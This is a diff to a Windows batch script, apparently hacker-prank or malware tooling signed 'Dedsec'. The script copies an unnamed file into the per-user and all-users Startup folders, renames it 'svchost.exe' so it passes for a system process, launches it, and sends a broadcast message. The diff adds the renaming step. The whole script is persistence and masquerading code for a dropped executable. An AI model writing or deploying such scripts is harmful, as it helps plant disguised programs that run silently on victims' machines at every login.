@@ -1,12 +1,11 @@
 REM TO windows 10 hackers, msg * has been disabled in all windows 10 devices by microsoft, therefore no message will display , unless windows 7 is used
 REM Windows 10 will experience less lag than running this bat file on a windows 7
 
-echo f|xcopy /f ".\svchost.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
-
+echo f|xcopy /f ".\abc" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 
+rename "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\abc" "svchost.exe"
 start explorer "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
-
-echo f|xcopy ".\svchost.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
-
+echo f|xcopy ".\abc" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 
+rename "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abc" "svchost.exe"
 
 msg * We are Dedsec 
 
